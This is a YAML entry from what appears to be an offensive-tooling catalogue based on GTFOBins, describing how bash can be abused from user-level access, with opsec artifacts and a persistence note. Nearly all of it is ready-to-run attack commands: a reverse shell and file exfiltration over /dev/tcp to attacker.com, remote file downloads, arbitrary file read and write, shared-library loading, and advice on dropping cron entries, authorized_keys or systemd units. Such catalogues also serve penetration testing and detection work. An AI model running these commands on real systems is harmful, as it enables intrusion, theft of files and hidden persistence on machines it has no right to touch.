---
name: bash
capabilities:
- exec
- spawn
- read
- write
- upload
- download
- reverse-shell
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: |-
    bash -p -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
        3<>/dev/tcp/attacker.com/12345 \
        | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
- id: download-2
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: bash -p -c 'echo "$(</dev/tcp/attacker.com/12345) >/path/to/output-file'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: bash -p -c 'echo "$(</path/to/input-file)"'
- id: file-read-2
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    HISTTIMEFORMAT=$'\r\e[K'
    history -c
    history -r /path/to/input-file
    history
  notes: This only works interactively from an existing `bash` session.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: bash -p -c 'echo DATA >/path/to/output-file'
- id: file-write-2
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    HISTIGNORE='history *'
    history -c
    DATA
    history -w /path/to/output-file
  notes: This only works interactively from an existing `bash` session. It adds timestamps to the output file.
- id: library-load
  description: Load an arbitrary shared library.
  capabilities:
  - exec
  command: bash -p -c 'enable -f /path/to/lib.so x'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: bash -p
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: bash -p -c 'echo -e "POST / HTTP/0.9\n\n$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
- id: upload-2
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: bash -p -c 'echo -n "$(</path/to/input-file)" >/dev/tcp/attacker.com/12345'
references:
- https://gtfobins.github.io/gtfobins/bash/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
